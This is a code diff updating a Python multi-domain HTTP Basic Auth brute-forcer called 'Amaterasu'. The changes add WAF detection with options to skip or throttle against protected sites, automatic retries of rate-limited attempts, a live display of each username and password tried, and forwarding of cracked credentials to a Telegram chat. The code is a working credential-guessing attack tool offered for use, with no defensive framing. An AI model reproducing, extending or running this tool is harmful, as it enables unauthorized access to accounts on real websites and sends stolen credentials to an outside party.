@@ -15,12 +15,24 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 # ---------------------------
 # Config
 # ---------------------------
-TELEGRAM_TOKEN = "TELEGRAM_TOKEN_HERE"
-TELEGRAM_CHAT_ID = "TELEGRAM_CHAT_ID_HERE" # Example: -1002838604754
+TELEGRAM_TOKEN = "TELEGRAM_TOKEN"
+TELEGRAM_CHAT_ID = "TELEGRAM_CHAT_ID"
 TELEGRAM_TOPIC_SUCCESS = None
 TELEGRAM_TOPIC_ERROR = None
 ERROR_CREDS = []
 ERROR_LOCK = threading.Lock()
+
+# ---------------------------
+# ANSI color codes
+# ---------------------------
+RESET = "\033[0m"
+BOLD = "\033[1m"
+CYAN = "\033[96m"
+GREEN = "\033[92m"
+YELLOW = "\033[93m"
+MAGENTA = "\033[95m"
+RED = "\033[91m"
+ORANGE = "\033[38;5;208m"  # for fire effect
 
 # ---------------------------
 # Session Management
@@ -95,36 +107,87 @@ def read_errors():
     return creds
 
 # ---------------------------
+# Display formatter
+# ---------------------------
+def status_emoji(code):
+    if code == 200:
+        return "✅"
+    elif code == 401:
+        return "🔒"
+    elif code == 403:
+        return "🚫"
+    elif code == 429:
+        return "⚠️"
+    elif code == 503:
+        return "🛑"
+    else:
+        return "❓"
+
+def format_display(state, domain, total):
+    with state['lock']:
+        count = state['count']
+        status_counts = state['status_counts'].copy()
+        user = state['current_user']
+        pwd = state['current_password']
+
+        # Build status summary
+        status_parts = []
+        for code in sorted(status_counts.keys(), key=lambda x: str(x)):
+            emoji = status_emoji(code)
+            status_parts.append(f"{emoji} {code}: {status_counts[code]}")
+        status_str = ", ".join(status_parts) if status_parts else "⏳ 0"
+
+        # Clear line, carriage return
+        return (
+            f"\033[2K\r"
+            f"{BOLD}{ORANGE}[{domain}]{RESET} "
+            f"{GREEN}Status:{RESET} {status_str} | "
+            f"{YELLOW}👤 Username:{RESET} {user:<15} | "
+            f"{YELLOW}🔑 Password:{RESET} {pwd:<15} | "
+            f"{MAGENTA}🔥 Progress:{RESET} {count}/{total}"
+        )
+
+# ---------------------------
 # Brute task
 # ---------------------------
-def try_cred(domain: str, user: str, pwd: str, args, session: requests.Session, progress_counter, total_creds, silent: bool):
+def try_cred(domain: str, user: str, pwd: str, args, session: requests.Session, state: dict, total: int):
     try:
+        with state['lock']:
+            state['current_user'] = user
+            state['current_password'] = pwd
+
         headers = build_auth(user, pwd)
         r = session.get(domain, headers=headers, timeout=args.timeout, verify=not args.insecure, allow_redirects=True)
         status = r.status_code
-        with progress_counter['lock']:
-            progress_counter['count'] += 1
-            current = progress_counter['count']
-        if not silent:
-            print(f"user: {user:<18} password: {pwd:<18} -> {status}")
-        if status != 401:
-            msg = f"SUCCESS\nDomain: {domain}\nCreds: {user}:{pwd}\nStatus: {status}"
-            print(msg)
-            save_success(domain, user, pwd, status)
-            send_telegram(msg, TELEGRAM_TOPIC_SUCCESS)
+
+        with state['lock']:
+            state['count'] += 1
+            state['status_counts'][status] = state['status_counts'].get(status, 0) + 1
+
+        # Save 403, 429, 503 for later retry
+        if status in [403, 429, 503]:
+            save_error(user, pwd, f"HTTP {status}")
+
+        # Success only if status is not 401, 403, 429, or 503
+        if status not in (401, 403, 429, 503):
+            with state['lock']:
+                state['success_found'] = True
+                state['success_details'] = (domain, user, pwd, status)
             return True
         return False
+
     except Exception as e:
         err_msg = str(e)[:50]
-        if not silent:
-            print(f"user: {user:<18} password: {pwd:<18} -> ERROR: {err_msg}")
         save_error(user, pwd, err_msg)
+        with state['lock']:
+            state['count'] += 1
+            state['status_counts']['ERR'] = state['status_counts'].get('ERR', 0) + 1
         return False
 
 # ---------------------------
 # Brute Engine per Domain
 # ---------------------------
-def run_brute_on_domain(domain: str, users, passes, args, retry_mode=False, silent=False):
+def run_brute_on_domain(domain: str, users, passes, args, retry_mode=False, silent=False, threads=None):
     global ERROR_CREDS
     ERROR_CREDS = []
     session = get_session()
@@ -132,34 +195,86 @@ def run_brute_on_domain(domain: str, users, passes, args, retry_mode=False, sile
     if not domain.startswith("http"):
         domain = "https://" + domain
 
-    # Initial 401 check
-    try:
-        r = session.get(domain, timeout=args.timeout, verify=not args.insecure)
+    # Use provided threads or default to args.threads
+    if threads is None:
+        threads = args.threads
+
+    waf_detected = False
+
+    # Initial 401 check - only for normal mode, not retry
+    if not retry_mode:
+        # Try connecting to the domain, fallback to http if https fails
+        original_domain = domain
+        candidate_urls = [domain]
+        if domain.startswith("https://"):
+            candidate_urls.append(domain.replace("https://", "http://", 1))
+        elif not domain.startswith("http://"):  # shouldn't happen after prepending https, but just in case
+            candidate_urls.append("http://" + domain)
+
+        connected_url = None
+        for url in candidate_urls:
+            try:
+                r = session.get(url, timeout=args.timeout, verify=not args.insecure)
+                connected_url = url
+                break
+            except Exception as e:
+                continue
+
+        if connected_url is None:
+            if not silent:
+                print(f"[{original_domain}] [!] Cannot reach (both https and http failed)")
+            session.close()
+            return False, waf_detected
+
+        # Use the working URL for the rest of the process
+        domain = connected_url
+
         if r.status_code != 401:
             if not silent:
                 print(f"[{domain}] [{r.status_code}] Not Basic Auth protected → Skipping")
             session.close()
-            return False
-    except Exception as e:
-        if not silent:
-            print(f"[{domain}] [!] Cannot reach: {e}")
-        session.close()
-        return False
+            return False, waf_detected
 
-    if not retry_mode and not silent:
-        print(f"[WAF] {detect_waf(domain, session)}")
+        # WAF detection
+        waf = detect_waf(domain, session)
+        if not silent:
+            print(f"[WAF] {waf}")
+        waf_detected = (waf != "No WAF")
+
+        # Skip if WAF detected and --skip-waf is set
+        if getattr(args, "skip_waf", False) and waf_detected:
+            if not silent:
+                print(f"[!] Skipping {domain} because WAF detected (--skip-waf)")
+            session.close()
+            return False, waf_detected
+
+        # If --waf is set and WAF detected, lower thread count
+        if waf_detected and getattr(args, "waf", None) is not None:
+            threads = args.waf
+            if not silent:
+                print(f"[!] WAF detected, using {threads} threads (--waf)")
 
     source = read_errors() if retry_mode else [(u, p) for u in users for p in passes]
     total = len(source)
     if total == 0:
-        return False
+        return False, waf_detected
 
     if not silent:
-        print(f"[+] {'Retry' if retry_mode else 'Brute'} {domain}: {total} attempts → {args.threads} threads")
+        print(f"[+] {'Retry' if retry_mode else 'Brute'} {domain}: {total} attempts → {threads} threads")
     else:
         print(f"[+] Starting {domain}: {total} attempts")
 
-    progress_counter = {'count': 0, 'lock': threading.Lock()}
+    state = {
+        'lock': threading.Lock(),
+        'count': 0,
+        'status_counts': {},
+        'current_user': '',
+        'current_password': '',
+        'success_found': False,
+        'success_details': None,
+        'print_lock': threading.Lock()
+    }
+
     success_found = False
 
     def cred_generator():
@@ -168,17 +283,15 @@ def run_brute_on_domain(domain: str, users, passes, args, retry_mode=False, sile
             time.sleep(0.001)
 
     gen = cred_generator()
-
-    # use getattr to avoid SyntaxError because "continue" is a keyword
     continue_flag = getattr(args, "continue", False)
 
-    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as pool:
+    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as pool:
         futures = set()
-        initial_fill = min(args.threads * 2, total, 1000)
+        initial_fill = min(threads * 2, total, 1000)
         for _ in range(initial_fill):
             try:
                 u, p = next(gen)
-                futures.add(pool.submit(try_cred, domain, u, p, args, session, progress_counter, total, silent))
+                futures.add(pool.submit(try_cred, domain, u, p, args, session, state, total))
             except StopIteration:
                 break
 
@@ -189,14 +302,24 @@ def run_brute_on_domain(domain: str, users, passes, args, retry_mode=False, sile
                 return_when=concurrent.futures.FIRST_COMPLETED
             )
 
-            current = progress_counter['count']
-            print(f"\rProgress [{domain}]: {current}/{total} | Active: {len(futures)}", end="", flush=True)
+            print(format_display(state, domain, total), end="", flush=True)
 
             for future in done:
                 if future.result():
                     success_found = True
+                    # Always send success message, even in continue mode
+                    with state['lock']:
+                        details = state['success_details']
+                    if details:
+                        d, u, p, s = details
+                        msg = f"🔥🎉 SUCCESS FOUND 🎉🔥\n\n🌐 Domain: {d}\n👤 Username: {u}\n🔑 Password: {p}\n📊 Status: {s}"
+                        if not continue_flag:
+                            print()  # newline before success message
+                            print(msg)
+                        save_success(d, u, p, s)
+                        send_telegram(msg, TELEGRAM_TOPIC_SUCCESS)
+                    
                     if not continue_flag:
-                        print(f"\n[!] Success found! Stopping brute on {domain} (use --continue to keep going)")
                         # Cancel all running tasks
                         for f in futures:
                             f.cancel()
@@ -216,18 +339,20 @@ def run_brute_on_domain(domain: str, users, passes, args, retry_mode=False, sile
             for _ in range(len(done)):
                 try:
                     u, p = next(gen)
-                    futures.add(pool.submit(try_cred, domain, u, p, args, session, progress_counter, total, silent))
+                    futures.add(pool.submit(try_cred, domain, u, p, args, session, state, total))
                 except StopIteration:
                     break
 
-    print()  # New line
+    print()  # new line after dynamic display ends
     session.close()
-    return success_found
-
+    return success_found, waf_detected
 
 # ---------------------------
 # Main
 # ---------------------------
+def print_separator():
+    print("\n" + "-" * 100 + "\n")
+
 def banner():
     print(r"""
     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣦⣀⠀⠀⠀⠀⠀⠀⢲⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡆⠀⠀⠀⠀⠀⠀⠀⠛⣦⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
@@ -254,28 +379,37 @@ def banner():
 ⠹⣿⣧⠻⣿⢿⣷⣻⣄⠘⣄⠀⢀⠿⣽⣻⢿⡿⣯⠟⠀⠀⠀⡼⠃⣴⠇⣸⠁⢸⢂⠘⢔⠀⡀⠀⡄⠻⣄⠘⣇⢡⠀⡉⠢⡀⠉⠁⡔⠋⠁⠨⠁⢀⢾⡀⠆⠘⣷⢿⣿⣿⣿⡿⠃⠀⢊⢉⡛⠋⠁⡠⠃⢠⠃⡘⠠⡀⢷⡀⡀⠻⢽⣿⣿⣿⠟⠀⠐⠁⣠⠿⠿⠛⠋⢁⣰⣿⣿⠁
 ⠀⠹⣿⣷⣌⡙⠛⠽⠷⢧⡈⠢⣄⠲⢍⡛⠳⠛⠁⢊⣠⠞⠋⣰⡟⢁⣴⠇⢀⠂⣦⣉⠢⢄⡑⠄⠈⣶⢄⣁⠙⠤⡂⠹⢦⣈⠓⠈⢠⡶⣼⡄⡶⣹⣧⣳⡘⠰⢌⡛⠚⢓⢫⠴⠁⠀⠈⠁⠀⢐⡭⠔⢒⡇⢠⣇⢠⣆⠈⣷⣈⠢⢄⡠⢉⠀⠀⣀⠄⠘⠁⠀⠀⣠⣴⡿⣿⡿⠋⠀
 ⠀⠀⠈⠙⠿⢽⣷⣶⣤⣤⣌⣦⣈⣳⣶⣤⣤⣴⣠⣭⣴⣶⣛⣧⣴⣾⣩⣴⣾⣧⣝⣯⣷⣶⣭⣗⣤⣈⣛⣶⣭⣝⣃⣂⣀⣉⣻⣦⣔⣿⣮⣅⣁⣻⣾⣽⣻⣧⣤⣥⣤⣠⣄⣤⣠⣤⣤⣴⣶⣯⣤⣶⣯⣴⣟⣿⣮⣟⣷⣮⣟⣿⣶⣶⣖⣶⣾⣥⣖⣶⣲⣮⣷⠿⠞⠋⠁⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⠀⠁⠀⠀⠀⠀⠀⠁⠀⠀⠀⠁⠀⠀⠀⠁⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠁⠈⠀⠀⠀⠁⠈⠀⠁⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-          
-          Amatrasu v1
+
+                                        🔥 Amaterasu 🔥
+----------------------------------------------------------------------------------------------------
     """)
 
 def main():
     parser = argparse.ArgumentParser(description="HTTP Basic Auth Brute Forcer - Multi-Domain, Stop/Continue on Success")
     parser.add_argument("-d", "--domain", help="Single target domain (e.g. https://example.com)")
-    parser.add_argument("--domains", help="File containing list of domains (one per line)")
-    parser.add_argument("--users", default="Username_List.txt", help="User list file")
-    parser.add_argument("--passes", default="Password_List.txt", help="Password list file")
-    parser.add_argument("--threads", type=int, default=50, help="Threads per domain (30-50 recommended)")
-    parser.add_argument("--timeout", type=float, default=5.0, help="Request timeout")
-    parser.add_argument("--insecure", action="store_true", help="Disable SSL verification")
-    parser.add_argument("--use-wafw00f", action="store_true", help="Use wafw00f for WAF detection")
+    parser.add_argument("-l", "--domains", help="File containing list of domains (one per line)")
+    parser.add_argument("-u", "--users", default="Username_List.txt", help="User list file (default: Username_List.txt)")
+    parser.add_argument("-p", "--passes", default="Password_List.txt", help="Password list file (default: Password_List.txt)")
+    parser.add_argument("-t", "--threads", type=int, default=50, help="Threads per domain (default: 50)")
+    parser.add_argument("--timeout", type=float, default=5.0, help="Request timeout (default: 5s)")
+    parser.add_argument("--no-insecure", action="store_false", dest="insecure", default=True,
+                        help="Enable SSL verification (disable insecure mode)")
+    parser.add_argument("--use-wafw00f", action="store_true", help="Use wafw00f for WAF detection (currently always used)")
     parser.add_argument("--silent", action="store_true", help="Show only progress and results")
-    parser.add_argument("--retry", action="store_true", help="Retry only failed credentials from ERRORS.txt")
+    parser.add_argument("--no-retry", action="store_false", dest="retry", default=True,
+                        help="Disable auto-retry of failed credentials (429/503/errors)")
     parser.add_argument("-c", "--continue", action="store_true", help="Continue brute-forcing even after success")
+    parser.add_argument("--skip-waf", action="store_true", help="Skip domains where WAF is detected")
+    parser.add_argument("--waf", nargs="?", const=10, type=int, default=None,
+                        help="If set, use lower thread count for domains with WAF (default: 10 if no value)")
     args = parser.parse_args()
 
     if not args.silent:
         banner()
+
+    # Clear ERRORS.txt at start to avoid stale entries from previous runs
+    if Path("ERRORS.txt").exists():
+        Path("ERRORS.txt").unlink()
 
     # Load domains
     if args.domains:
@@ -288,37 +422,40 @@ def main():
         print("[!] Provide --domain or --domains")
         sys.exit(1)
 
-    # Load credentials
-    if args.retry:
-        error_creds = read_errors()
-        if not error_creds:
-            print("[!] No errors to retry.")
-            return
-        users = [u for u, p in error_creds]
-        passes = [p for u, p in error_creds]
-        print(f"[+] Retrying {len(error_creds)} failed attempts across {len(domains)} domain(s)...")
-    else:
-        users = read_list(args.users)
-        passes = read_list(args.passes)
-        if not users or not passes:
-            sys.exit(1)
+    # Load credentials for main brute (always use user/pass lists, not errors)
+    users = read_list(args.users)
+    passes = read_list(args.passes)
+    if not users or not passes:
+        print("[!] Missing username or password lists.")
+        sys.exit(1)
 
-    # Process each domain
     overall_success = False
-    for domain in domains:
-        success = run_brute_on_domain(domain, users, passes, args, retry_mode=args.retry, silent=args.silent)
+    for idx, domain in enumerate(domains):
+        if idx > 0:
+            print_separator()
+
+        success, waf_detected = run_brute_on_domain(domain, users, passes, args, retry_mode=False, silent=args.silent)
         if success:
             overall_success = True
-        # Auto-retry failed creds on this domain if needed
-        if not args.retry and not success and Path("ERRORS.txt").exists():
-            error_count = len(read_errors())
-            if error_count > 0 and error_count < len(users) * len(passes):
-                if not args.silent:
-                    print(f"\n[+] Auto-retrying {error_count} failed attempts on {domain}...")
-                time.sleep(1)
-                run_brute_on_domain(domain, [], [], args, retry_mode=True, silent=args.silent)
 
-    print("[+] All done." if overall_success else "[-] No success. Check ERRORS.txt")
+        # Auto-retry failed creds
+        if args.retry and not success and Path("ERRORS.txt").exists():
+            error_count = len(read_errors())
+            if error_count > 0:
+                if not args.silent:
+                    print(f"\n🔥 Auto-retrying {error_count} failed attempts on {domain}...")
+                time.sleep(1)
+                retry_threads = 10
+                if waf_detected and args.waf is not None:
+                    retry_threads = args.waf
+                retry_success, _ = run_brute_on_domain(domain, [], [], args, retry_mode=True, silent=args.silent, threads=retry_threads)
+                if retry_success:
+                    overall_success = True
+
+        if Path("ERRORS.txt").exists():
+            Path("ERRORS.txt").unlink()
+
+    print("🔥✅ All done." if overall_success else "🔥❌ No success.")
     sys.exit(0 if overall_success else 1)
 
 if __name__ == "__main__":
